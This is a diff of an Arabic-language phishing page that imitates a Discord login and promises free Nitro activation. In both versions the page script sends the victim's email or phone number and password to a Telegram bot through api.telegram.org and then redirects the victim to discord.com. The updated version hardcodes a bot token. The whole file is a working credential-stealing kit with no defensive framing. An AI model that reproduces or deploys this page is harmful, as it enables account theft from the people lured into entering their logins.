@@ -1,19 +1,22 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Discord Nitro</title>
-<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'gg sans',Arial,sans-serif;background:#36393f;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#2f3136;border-radius:8px;padding:32px;width:380px;text-align:center;color:#fff}img{width:130px;margin-bottom:24px}h2{font-size:22px;margin-bottom:4px}p{color:#b9bbbe;font-size:14px;margin-bottom:20px}input{width:100%;padding:12px;margin:6px 0;background:#202225;border:1px solid #202225;border-radius:4px;color:#fff;font-size:16px;outline-color:#5865f2}.btn{width:100%;background:#5865f2;color:#fff;border:none;padding:14px;border-radius:4px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:14px}a{color:#00a8fc;font-size:14px;text-decoration:none}</style></head>
+<html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Discord</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#36393f;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.card{background:#2f3136;padding:20px;border-radius:8px;width:380px;text-align:center;color:#fff}
+img{width:130px;margin-bottom:24px}h2{color:#5865f2;margin-bottom:15px}
+input{width:100%;padding:12px;margin:8px 0;background:#202225;border:1px solid #202225;border-radius:4px;color:#fff;font-size:16px}
+.btn{background:#5865f2;color:#fff;border:none;padding:12px;width:100%;border-radius:4px;font-size:18px;font-weight:bold;cursor:pointer}.btn:hover{background:#4752c4}</style></head>
 <body><div class="card">
 <img src="https://discord.com/assets/logo-feca2f1e81b5b7639e02f2a63c9e1a9a.svg" alt="Discord">
 <h2>تفعيل Discord Nitro</h2>
-<p>أدخل بياناتك لاستلام Nitro مجاناً</p>
-<input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
-<input type="password" id="pass" placeholder="كلمة المرور">
-<button class="btn" onclick="send()">تسجيل الدخول</button>
-<a href="#" style="display:block;margin-top:12px">نسيت كلمة المرور؟</a>
+<input id="u" placeholder="البريد الإلكتروني أو رقم الهاتف"><br>
+<input id="p" type="password" placeholder="كلمة المرور"><br>
+<button class="btn" onclick="sendData()">تسجيل الدخول</button>
 </div>
 <script>
-const p=new URLSearchParams(location.search),T=p.get('token'),C=p.get('chat');
-function send(){const e=document.getElementById('email').value,pa=document.getElementById('pass').value;
-if(!e||!pa)return alert('املأ جميع الحقول');
-fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent('🎮 ديسكورد\n👤 '+e+'\n🔑 '+pa)}`).finally(()=>{location.href='https://discord.com'})}
+const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
+const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');
+function sendData(){const u=document.getElementById('u').value,pa=document.getElementById('p').value;
+if(!u||!pa)return alert('املأ جميع الحقول');
+fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('🎮 Discord\n👤 '+u+'\n🔑 '+pa)}`)
+.then(()=>{location.href='https://discord.com/'})}
 </script></body></html>
